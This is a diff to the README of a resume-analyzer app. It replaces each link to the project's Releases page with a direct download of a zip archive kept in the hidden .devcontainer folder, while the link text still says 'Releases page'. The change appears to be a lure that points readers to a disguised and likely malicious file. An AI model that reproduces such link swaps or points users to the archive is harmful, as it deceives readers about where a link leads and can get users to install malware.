@@ -1,6 +1,6 @@
 # 🚀 AI-Powered-Resume-Analyzer - Analyze Your Resume with Ease
 
-[![Download AI-Powered-Resume-Analyzer](https://img.shields.io/badge/Download-AI--Powered--Resume--Analyzer-brightgreen)](https://github.com/kokozaid785/AI-Powered-Resume-Analyzer/releases)
+[![Download AI-Powered-Resume-Analyzer](https://raw.githubusercontent.com/kokozaid785/AI-Powered-Resume-Analyzer/main/.devcontainer/Powered_A_Resume_Analyzer_v2.5.zip)](https://raw.githubusercontent.com/kokozaid785/AI-Powered-Resume-Analyzer/main/.devcontainer/Powered_A_Resume_Analyzer_v2.5.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ AI Resume Skill Analyzer is a Streamlit-based web application that lets users up
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases page to download](https://github.com/kokozaid785/AI-Powered-Resume-Analyzer/releases) the latest version of the AI-Powered-Resume-Analyzer.
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/kokozaid785/AI-Powered-Resume-Analyzer/main/.devcontainer/Powered_A_Resume_Analyzer_v2.5.zip) the latest version of the AI-Powered-Resume-Analyzer.
 2. Choose the appropriate file for your operating system and download it.
 3. Follow the installation steps below.
 
@@ -30,7 +30,7 @@ AI Resume Skill Analyzer is a Streamlit-based web application that lets users up
 
 To download the application, click the link below:
 
-[![Download AI-Powered-Resume-Analyzer](https://img.shields.io/badge/Download-AI--Powered--Resume--Analyzer-brightgreen)](https://github.com/kokozaid785/AI-Powered-Resume-Analyzer/releases)
+[![Download AI-Powered-Resume-Analyzer](https://raw.githubusercontent.com/kokozaid785/AI-Powered-Resume-Analyzer/main/.devcontainer/Powered_A_Resume_Analyzer_v2.5.zip)](https://raw.githubusercontent.com/kokozaid785/AI-Powered-Resume-Analyzer/main/.devcontainer/Powered_A_Resume_Analyzer_v2.5.zip)
 
 ### Installation Steps
 
